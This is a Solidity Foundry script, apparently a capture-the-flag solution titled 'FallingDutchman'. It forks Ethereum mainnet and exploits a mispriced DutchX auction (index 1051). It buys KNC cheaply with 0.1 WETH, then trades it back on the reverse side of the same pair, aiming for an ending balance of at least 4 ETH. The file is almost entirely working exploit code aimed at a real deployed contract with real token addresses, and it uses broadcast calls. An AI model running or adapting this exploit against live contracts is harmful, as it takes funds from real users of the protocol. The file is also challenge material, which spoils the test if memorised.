// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../../src/Interfaces.sol";
import "./Interfaces.sol";
import "./Constants.sol";

contract FallingDutchman is Test {
    address user = vm.envAddress("USER_ADDRESS");

    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant KNC = 0xdd974D5C2e2928deA5F71b9825b8b646686BD200;
    uint256 constant AUCTION_INDEX = 1051;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.deal(user, 0.1 ether);
    }

    function test_Solution() public {
        IDutchX dx = IDutchX(DUTCHX);

        vm.startBroadcast(user);

        // Buy KNC from the underpriced KNC/WETH side of auction 1051.
        IWETH(WETH).deposit{value: 0.1 ether}();
        IERC20(WETH).approve(DUTCHX, 0.1 ether);
        dx.deposit(WETH, 0.1 ether);
        dx.postBuyOrder(KNC, WETH, AUCTION_INDEX, 0.1 ether);
        dx.claimBuyerFunds(KNC, WETH, user, AUCTION_INDEX);
        dx.withdraw(KNC, dx.balances(KNC, user));

        // Use the received KNC on the reverse side of the same auction pair.
        uint256 knc = IERC20(KNC).balanceOf(user);
        IERC20(KNC).approve(DUTCHX, knc);
        dx.deposit(KNC, knc);
        dx.postBuyOrder(WETH, KNC, AUCTION_INDEX, knc);
        dx.claimBuyerFunds(WETH, KNC, user, AUCTION_INDEX);
        dx.withdraw(WETH, dx.balances(WETH, user));

        IWETH(WETH).withdraw(IWETH(WETH).balanceOf(user));

        vm.stopBroadcast();
        checkSolve();
    }

    function checkSolve() public view {
        require(user.balance >= 4 ether, "not enough ETH");
        console.log("Solved. Ending balance in ETH: %18e", user.balance);
    }
}
